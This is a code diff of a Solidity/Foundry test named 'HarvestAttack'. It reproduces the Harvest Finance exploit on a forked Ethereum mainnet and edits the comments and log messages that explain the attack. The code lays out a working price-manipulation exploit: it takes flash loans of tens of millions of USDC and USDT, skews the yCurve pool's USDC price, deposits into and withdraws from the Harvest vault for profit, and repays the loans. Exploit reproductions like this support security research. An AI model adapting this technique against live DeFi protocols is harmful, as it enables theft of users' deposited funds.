@@ -55,6 +55,8 @@ interface IyCRVSwap {
         uint256 dx,
         uint256 min_dy
     ) external;
+
+    function balances(int128) external returns (uint256);
 }
 
 interface IHarvestUsdcVault {
@@ -103,6 +105,8 @@ contract Initializations {
         IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
 
     // yDAI+yUSDC+yUSDT+yTUSD
+    // 1 -> USDC
+    // 2 -> USDT
     IyCRVSwap yCRVSwap = IyCRVSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
 
     // Harvest USDC pool
@@ -122,16 +126,16 @@ contract Initializations {
     IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
 
     uint256 usdcLoan = 50000000 * 10**6;
+    // uniswap needs to be paid back 0.3% LP fee
     uint256 usdcRepayment = (usdcLoan * 100301) / 100000;
+
     uint256 usdtLoan = 17300000 * 10**6;
     uint256 usdtRepayment = (usdtLoan * 100301) / 100000;
-    uint256 usdcBal;
-    uint256 usdtBal;
 }
 
-contract ContractTest is Test, Initializations {
+contract HarvestAttack is Test, Initializations {
     function setUp() public {
-        vm.createSelectFork("mainnet", 11129473); //fork mainnet at block 11129473
+        vm.createSelectFork("mainnet", 11129473); //go back in time
     }
 
     function testExploit() public {
@@ -195,7 +199,7 @@ contract ContractTest is Test, Initializations {
         }
 
         if (msg.sender == address(usdtPair)) {
-            for (uint256 i = 0; i < 5; i++) {
+            for (uint256 i = 0; i < 1; i++) {
                 // manipulate prices and get USDCs
                 theSwap(i);
             }
@@ -218,13 +222,27 @@ contract ContractTest is Test, Initializations {
         );
 
         emit log(" ");
+
+        emit log_named_uint(
+            "yCurve balance of USDT",
+            yCRVSwap.balances(2) / 1e6
+        );
+        emit log_named_uint(
+            "yCurve balance of USDC",
+            yCRVSwap.balances(1) / 1e6
+        );
+        emit log(
+            "about 59.7 mil USDCs available. If we change the volume of about a third of the whole, we could impact the pool dynamics"
+        );
+
+        emit log(" ");
         emit log("exchanging USDT for USDC on yCurve...");
 
         // https://curve.readthedocs.io/factory-pools.html?highlight=exchange_underlying#StableSwap.exchange_underlying
         // swap USDT => USDC
-        // this causes price of USDC to rise in this pool
         // if get_virtual_price was used by the harvest vault, there'd be no hack
         yCRVSwap.exchange_underlying(2, 1, 17200000 * 10**6, 17000000 * 10**6);
+        // this causes price of USDC to rise in this pool
 
         emit log("yCurve exchange success");
 
@@ -245,6 +263,9 @@ contract ContractTest is Test, Initializations {
             "current underlying investment in yCurve by harvest strategy vault",
             harvestCurveStrategy.investedUnderlyingBalance() / 1e6
         );
+        emit log(
+            "The fUSDCs cast to attacker account will not be greater than this number, so deposit lesser then this"
+        );
 
         // we can only deposit in harvest --- total USDC balance in account - deposit for reverse in yCRV
         // in such a way that we have enough for deposit to curve for the reverse deposit of 17 mil
@@ -257,10 +278,6 @@ contract ContractTest is Test, Initializations {
 
         emit log(" ");
         emit log("=== after harvest deposit ===");
-        emit log_named_uint(
-            "current underlying investment in yCurve by harvest strategy vault",
-            harvestCurveStrategy.investedUnderlyingBalance() / 1e6
-        );
 
         emit log(" ");
         emit log_named_uint(
@@ -290,7 +307,8 @@ contract ContractTest is Test, Initializations {
         emit log("=== after reverse swap in yCRV pool ===");
 
         emit log(
-            "By depositing USDC to the yCRV pool, the USDC/yUSDC ratio returns to its original high, which allows us to withdraw more USDCs per fUSDC"
+            "By depositing USDC to the yCRV pool, the USDC/yUSDC ratio returns to its original high, which affects the"
+            "investedUnderlyingBalance which allows us to withdraw more USDCs per fUSDC"
         );
         emit log_named_uint(
             "current underlying investment in yCRV by harvest strategy vault",
